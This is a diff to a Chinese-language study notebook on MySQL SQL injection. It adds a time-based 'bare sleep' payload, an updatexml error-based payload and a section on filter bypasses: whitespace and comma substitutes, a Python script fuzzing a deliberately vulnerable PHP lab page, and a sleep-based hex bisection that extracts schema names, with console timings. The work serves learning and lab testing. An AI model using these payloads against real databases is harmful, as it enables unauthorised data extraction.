@@ -27,6 +27,7 @@
   - [约束攻击](#约束攻击)
   - [无列名注入](#无列名注入)
   - [insert update delete注入](#insert-update-delete注入)
+- [过滤与替换](#过滤与替换)
 - [未完待续...](#未完待续)
 
 ## 注释
@@ -549,7 +550,17 @@ Time: 0.010s
 
 `select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,sleep(5),1)#`
 
-2. benchmark
+裸sleep注入
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132128341.png)
+
+实际使用
+
+`' or sleep(ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>100)#`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132132924.png)
+
+1. benchmark
 
 `BENCHMARK(count,exp)`重复执行`count`次`exp`中的内容,其返回值为0
 
@@ -2047,6 +2058,10 @@ select * from(select * from table1 as a join table1 as b using (id))c;
 select * from(select * from table1 as a join table1 as b using (id,username))c;
 ```
 
+payload如下
+
+`' and updatexml(1,(select * from(select * from table1 as a join table1 as b)c),1)#`
+
 4. ascii
 
 ```
@@ -2124,5 +2139,164 @@ Time: 0.008s
 与`select`不同,没有数据直接回显,通常结合报错注入或延时注入
 
 >insert注入会产生大量垃圾数据,delete注入要注意防止条件为永真
+
+## 过滤与替换
+
+1. `and or`被过滤
+
+用`&&`和`||`代替
+
+2. 空格被过滤
+
+- 用`/*xxx*/`或者`+`(加号有使用限制)作为空格的替换
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131536800.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131537199.png)
+
+- 特殊的ascii字符
+
+```php
+<?php
+error_reporting(0);
+$db = new mysqli("192.168.241.128", "root", "root", "mysql", "50547");
+if (mysqli_connect_errno()) { #检查连接
+    printf("Connect failed: %s\n", mysqli_connect_error());
+    exit();
+}
+$str =$_GET['str'];
+var_dump($str);
+$result = $db->query($str);
+if ($result->num_rows !== 0) {
+    echo $result->fetch_row()[0];
+}
+```
+
+```python
+import time
+
+import requests
+
+url = 'http://192.168.2.2:8000/sql_injection_test/space.php'
+url_char = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
+
+for i in url_char:
+    for j in url_char:
+        r = requests.get(url='http://192.168.2.2:8000/sql_injection_test/space.php?str=select%' + i + j + 'user();')
+        if 'root@192.168.241.1' in r.text:
+            print('%' + i + j)
+    time.sleep(5)
+```
+
+```
+%09
+%0a
+%0b
+%0c
+%0d
+%20
+%2b
+%a0
+```
+
+- 用`()`和`{}`去闭合从而绕过空格的限制
+
+样例`select(user),(host)from(mysql.user);`
+
+真实模拟
+
+`select user,host from mysql.user where user='root'union(select(group_concat(schema_name)),(null)from(information_schema.schemata))#'`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131650473.png)
+
+样例`select{x(user)},{x(host)}from{x(mysql.user)};`
+
+真实模拟
+
+`select user,host from mysql.user where user='root'union(select{x(group_concat(schema_name))},{x(null)}from{x(information_schema.schemata)})#'`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131742371.png)
+
+3. 逗号被过滤
+
+`select 1,2,3;`
+
+`select * from((select 1)a join (select 2)b join (select 3)c);`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131826535.png)
+
+真实模拟
+
+`select user,host,file_priv from mysql.user where user='root'union select * from ((select group_concat(schema_name) from information_schema.schemata)a join (select 1)b join (select 2)c)#'`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132047064.png)
+
+>假设逗号跟空格(包括替换字符)都不允许出现,同时目标不报错不回显
+
+可以利用之前提到的裸sleep注入
+
+`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'0'and'G'))#'`
+
+`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'6'and'G'))#'`
+
+`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'7'and'G'))#'`
+
+```
+mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'0'and'G'))#'
++------+------+-----------+
+| user | host | file_priv |
++------+------+-----------+
+0 rows in set
+Time: 2.011s
+mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'6'and'G'))#'
++------+------+-----------+
+| user | host | file_priv |
++------+------+-----------+
+0 rows in set
+Time: 2.013s
+mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'7'and'G'))#'
++------+------+-----------+
+| user | host | file_priv |
++------+------+-----------+
+0 rows in set
+Time: 0.009s
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132120052.png)
+
+`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666E'and'696E666G'))#'`
+
+`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666F'and'696E666G'))#'`
+
+`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666G'and'696E666G'))#'`
+
+```
+mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666E'and'696E666G'))#'
++------+------+-----------+
+| user | host | file_priv |
++------+------+-----------+
+0 rows in set
+Time: 2.016s
+mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666F'and'696E666G'))#'
++------+------+-----------+
+| user | host | file_priv |
++------+------+-----------+
+0 rows in set
+Time: 2.009s
+mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666G'and'696E666G'))#'
++------+------+-----------+
+| user | host | file_priv |
++------+------+-----------+
+0 rows in set
+Time: 0.010s
+```
+
+1. 比较操作符
+
+
+
+
+
+
 
 ## 未完待续...
